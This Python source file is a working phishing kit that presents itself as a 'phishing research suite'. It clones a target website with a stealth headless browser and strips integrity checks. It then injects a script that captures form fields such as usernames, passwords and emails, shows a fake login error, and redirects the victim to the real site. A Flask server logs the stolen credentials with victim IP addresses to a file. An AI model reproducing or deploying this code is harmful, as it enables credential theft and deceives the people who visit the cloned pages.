import os
import re
import sys
import asyncio
import argparse
import hashlib
import mimetypes
import json
from urllib.parse import urljoin, urlparse
from playwright.async_api import async_playwright
from playwright_stealth import Stealth
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

class HTTracker:
    def __init__(self, output_dir="cloned_sites"):
        self.output_dir = output_dir
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
        self.downloaded_assets = {} 
        self.project_dir = ""

    def print_banner(self):
        banner = f"""
{Fore.CYAN}{Style.BRIGHT}
  _    _ _______ _______   _______               _             
 | |  | |__   __|__   __| |__   __|             | |            
 | |__| |  | |     | |       | | _ __ __ _  ___| | _____ _ __ 
 |  __  |  | |     | |       | || '__/ _` |/ __| |/ / _ \\ '__|
 | |  | |  | |     | |       | || | | (_| | (__|   <  __/ |   
 |_|  |_|  |_|     |_|       |_||_|  \\__,_|\\___|_|\\_\\___|_|   
                                                               
{Fore.YELLOW}Ultimate Web Mirroring & Phishing Research Suite v3.5
{Fore.WHITE}-----------------------------------------------------
"""
        print(banner)

    async def intercept_response(self, response):
        url = response.url
        if not url.startswith('http') or (response.request.resource_type == "document" and url == self.target_url):
            return

        content_type = response.headers.get("content-type", "")
        interesting_types = ["image", "stylesheet", "script", "font", "media"]
        if not any(t in content_type or response.request.resource_type == t for t in interesting_types):
            if not any(url.endswith(ext) for ext in [".css", ".js", ".png", ".jpg", ".jpeg", ".woff", ".woff2", ".ttf", ".svg"]):
                return

        try:
            body = await response.body()
            parsed_url = urlparse(url)
            path = parsed_url.path if parsed_url.path and parsed_url.path != "/" else "/index_asset"
            
            if not os.path.splitext(path)[1]:
                ext = mimetypes.guess_extension(content_type.split(';')[0])
                if ext: path += ext
            
            safe_path = re.sub(r'[<>:"|?*]', '_', path).lstrip('/')
            if len(safe_path) > 150:
                name, ext = os.path.splitext(safe_path)
                safe_path = hashlib.md5(name.encode()).hexdigest() + ext
                
            local_rel_path = os.path.join("assets", safe_path)
            local_full_path = os.path.join(self.project_dir, local_rel_path)
            
            os.makedirs(os.path.dirname(local_full_path), exist_ok=True)
            with open(local_full_path, "wb") as f:
                f.write(body)
            
            self.downloaded_assets[url] = {
                "local_rel": local_rel_path.replace("\\", "/"),
                "local_full": local_full_path,
                "type": content_type
            }
            print(f"  {Fore.WHITE}Captured: {url[:60]}...", end="\r")
        except:
            pass

    def fix_css_paths(self):
        print(f"\n{Fore.YELLOW}[*] Fixing internal paths in CSS files...")
        css_files = [item for item in self.downloaded_assets.values() if "stylesheet" in item["type"] or item["local_rel"].endswith(".css")]
        for css_item in css_files:
            try:
                with open(css_item["local_full"], "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                
                def replace_url(match):
                    found_url = match.group(2).strip("'\"")
                    if found_url.startswith("data:"): return match.group(0)
                    for remote, info in self.downloaded_assets.items():
                        if remote.endswith(found_url) or found_url in remote:
                            return f"url('{os.path.basename(info['local_rel'])}')"
                    return match.group(0)

                new_content = re.sub(r'url\((["\']?)([^)]+)\1\)', replace_url, content)
                with open(css_item["local_full"], "w", encoding="utf-8") as f:
                    f.write(new_content)
            except: pass

    async def clone(self, url, wait_time=15, inject_interceptor=True):
        self.print_banner()
        self.target_url = url
        parsed_url = urlparse(url)
        domain = parsed_url.netloc if parsed_url.netloc else parsed_url.path.split('/')[0]
        safe_domain = re.sub(r'[<>:"|?*]', '_', domain).replace(".", "_")
        
        self.project_dir = os.path.join(self.output_dir, safe_domain)
        os.makedirs(self.project_dir, exist_ok=True)
        os.makedirs(os.path.join(self.project_dir, "assets"), exist_ok=True)

        print(f"{Fore.GREEN}[*] Launching high-fidelity browser...")
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(
                ignore_https_errors=True,
                viewport={'width': 1920, 'height': 1080},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
            )
            await Stealth().apply_stealth_async(context)
            page = await context.new_page()
            page.on("response", self.intercept_response)

            print(f"{Fore.CYAN}[->] Navigating and Intercepting: {url}")
            try:
                await page.goto(url, wait_until="networkidle", timeout=90000)
                print(f"{Fore.BLUE}[*] Capturing dynamic states...")
                for _ in range(3):
                    await page.mouse.wheel(0, 2000)
                    await asyncio.sleep(2)
                
                await asyncio.sleep(wait_time)
                self.fix_css_paths()
                content = await page.content()
                
                print(f"\n{Fore.GREEN}[*] Patching HTML with captured assets...")
                final_html = self.patch_html(content)
                
                if inject_interceptor:
                    final_html = self.inject_payload(final_html, url)
                
                index_path = os.path.join(self.project_dir, "index.html")
                with open(index_path, "w", encoding="utf-8") as f:
                    f.write(final_html)
                
                print(f"{Fore.GREEN}{Style.BRIGHT}[+] Success! Page Mirrored.")
                print(f"{Fore.WHITE}Location: {os.path.abspath(self.project_dir)}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}")
            finally:
                await browser.close()

    def inject_payload(self, html, redirect_url):
        payload = f"""
        <script>
        (function() {{
            const redirectUrl = "{redirect_url}";
            let isLogging = false;

            async function logAndProcess(data) {{
                if (isLogging) return;
                isLogging = true;
                
                // Show a fake loading state
                const btn = document.querySelector('button, input[type="submit"]');
                if (btn) btn.innerHTML = "Logging in...";

                try {{
                    const resp = await fetch('/__log', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            url: window.location.href,
                            timestamp: new Date().toISOString(),
                            data: data
                        }})
                    }});
                    const result = await resp.json();
                    
                    if (result.action === "redirect") {{
                        window.location.replace(redirectUrl);
                    }} else {{
                        // Simulated error for first attempt
                        alert("Invalid username or password. Please try again.");
                        if (btn) btn.innerHTML = "Log In";
                        isLogging = false;
                    }}
                }} catch (e) {{ 
                    window.location.replace(redirectUrl);
                }}
            }}

            function scrapeData() {{
                const data = {{}};
                document.querySelectorAll('input, select, textarea').forEach(el => {{
                    if (el.name || el.id) {{
                        const key = el.name || el.id;
                        if (el.type === 'checkbox' || el.type === 'radio') {{
                            if (el.checked) data[key] = el.value;
                        }} else if (el.value) {{
                            data[key] = el.value;
                        }}
                    }}
                }});
                return data;
            }}

            document.addEventListener('submit', function(e) {{
                const data = scrapeData();
                if (Object.keys(data).length > 0) {{
                    e.preventDefault();
                    logAndProcess(data);
                }}
            }}, true);

            document.addEventListener('click', function(e) {{
                const btn = e.target.closest('button, input[type="submit"], [role="button"]');
                if (btn) {{
                    const data = scrapeData();
                    const hasAuthFields = Object.keys(data).some(k => 
                        k.toLowerCase().includes('pass') || 
                        k.toLowerCase().includes('user') || 
                        k.toLowerCase().includes('email')
                    );
                    if (hasAuthFields && !isLogging) {{
                        e.preventDefault();
                        logAndProcess(data);
                    }}
                }}
            }}, true);
        }})();
        </script>
        """
        if "</body>" in html:
            return html.replace("</body>", f"{payload}</body>")
        return html + payload

    def patch_html(self, html):
        sorted_assets = sorted(self.downloaded_assets.items(), key=lambda x: len(x[0]), reverse=True)
        for remote_url, info in sorted_assets:
            local_path = info["local_rel"]
            html = html.replace(f'"{remote_url}"', f'"{local_path}"')
            html = html.replace(f"'{remote_url}'", f"'{local_path}'")
            html = html.replace(f'url({remote_url})', f'url({local_path})')
            html = html.replace(remote_url, local_path)
        
        html = re.sub(r'integrity="[^"]*"', '', html)
        html = re.sub(r'crossorigin="[^"]*"', '', html)
        return html

def start_server(project_dir):
    from flask import Flask, request, send_from_directory, jsonify
    app = Flask(__name__, static_folder=project_dir)
    
    # Store dynamic state for multi-step facade
    hit_counts = {} 

    @app.route('/')
    def index():
        return send_from_directory(project_dir, 'index.html')

    @app.route('/<path:path>')
    def serve_assets(path):
        return send_from_directory(project_dir, path)

    @app.route('/__log', methods=['POST'])
    def log_creds():
        data = request.json
        client_ip = request.remote_addr
        
        # Increment hit count for this IP to decide action
        hit_counts[client_ip] = hit_counts.get(client_ip, 0) + 1
        
        print(f"\n{Fore.RED}{Style.BRIGHT}[!!!] CREDENTIALS INTERCEPTED (Hit #{hit_counts[client_ip]}) [!!!]")
        print(json.dumps(data, indent=4))
        
        creds_file = os.path.join(project_dir, "captured_credentials.txt")
        with open(creds_file, "a") as f:
            f.write(f"--- {data.get('timestamp', 'N/A')} (Attempt #{hit_counts[client_ip]}) ---\n")
            f.write(f"IP: {client_ip} | Source: {data.get('url', 'N/A')}\n")
            f.write(f"Data: {json.dumps(data.get('data', {}), indent=2)}\n\n")
        
        # Decide action: 
        # 1st attempt: simulated error
        # 2nd+ attempt: redirect to real site
        if hit_counts[client_ip] >= 2:
            return jsonify({"status": "ok", "action": "redirect"})
        else:
            return jsonify({"status": "ok", "action": "error"})

    print(f"\n{Fore.YELLOW}[*] Logging Server started on http://127.0.0.1:5000")
    print(f"{Fore.WHITE}[!] Capturing to: {os.path.join(project_dir, 'captured_credentials.txt')}")
    app.run(port=5000, host="0.0.0.0")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ultimate Web Mirroring & Phishing Suite")
    parser.add_argument("url", nargs="?", help="Target URL to clone")
    parser.add_argument("--wait", type=int, default=15, help="Time to wait (default 15s)")
    parser.add_argument("--serve", action="store_true", help="Start the logging server after cloning")
    
    args = parser.parse_args()
    
    if args.url:
        tracker = HTTracker()
        asyncio.run(tracker.clone(args.url, wait_time=args.wait))
        
        if args.serve:
            start_server(tracker.project_dir)
    else:
        print(f"{Fore.RED}[!] Please provide a URL to clone.")
